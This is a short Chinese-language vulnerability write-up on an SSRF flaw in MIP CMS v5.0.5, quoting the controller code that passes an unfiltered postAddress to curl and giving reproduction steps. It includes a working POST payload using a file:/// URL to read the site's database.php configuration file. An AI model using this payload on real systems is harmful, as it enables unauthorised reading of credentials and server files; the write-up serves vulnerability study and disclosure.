MIP建站系统 v5.0.5 SSRF漏洞
===========================

一、漏洞简介
------------

二、漏洞影响
------------

MIP建站系统 v5.0.5

三、复现过程
------------

### 漏洞分析

进行简单的漏洞分析。根据漏洞定位代码文件：app/setting/controller/ApiAdminDomainSettings.php受影响代码：

    public function urlPost(Request $request) {
            $postAddress = input('post.postAddress');
            if (!$postAddress) {
                return jsonError('请先去设置推送的接口');
            }
            $api = trim($postAddress);
            if (strpos($api,'type=realtime') !== false || strpos($api,'type=batch') !== false) {
                if (!config('siteInfo')['guanfanghaoStatus']) {
                    return jsonError('检测到您未开启熊掌号，请开启后再推送');
                }
            }
            $url = input('post.url');
            $id = input('post.id');
            if (!$url) {
                return jsonError('没有检测到你推送的页面地址');
            }   
            $urls[] = $url;
            $ch = curl_init();
            $options =  array(
                CURLOPT_URL => $api,
                CURLOPT_POST => true,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POSTFIELDS => implode("\n", $urls),
                CURLOPT_HTTPHEADER => array('Content-Type: text/plain'),
            );
            curl_setopt_array($ch, $options);
            $result = curl_exec($ch);

流程分析：

    1、$ postAddress = input('post.postAddress');  
        //POST方法将$postAddress参数传入

    2、$api = trim($postAddress);    
    $options =  array(
                CURLOPT_URL => $api,
                CURLOPT_POST => true,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POSTFIELDS => implode("\n", $urls),
                CURLOPT_HTTPHEADER => array('Content-Type: text/plain'),
            );
            curl_setopt_array($ch, $options); 
        //赋予$api参数，一直至$ch，未进行任何过滤
    3、$result = curl_exec($ch);    
        //最后执行

### 漏洞复现

第一步，登陆该后台：

第二步，访问所受影响的代码文件：

    http://www.0-sec.org/index.php？s=/setting/ApiAdminDomainSettings/urlPost；
    POST方法进行请求，payload：  
    postAddress=file:///C:\phpStudy\PHPTutorial\WWW\app\database.php&url=test&id=test

![](/Users/aresx/Documents/VulWiki/.resource/MIP建站系统v5.0.5SSRF漏洞/media/rId26.png)

参考链接
--------

> https://xz.aliyun.com/t/7431
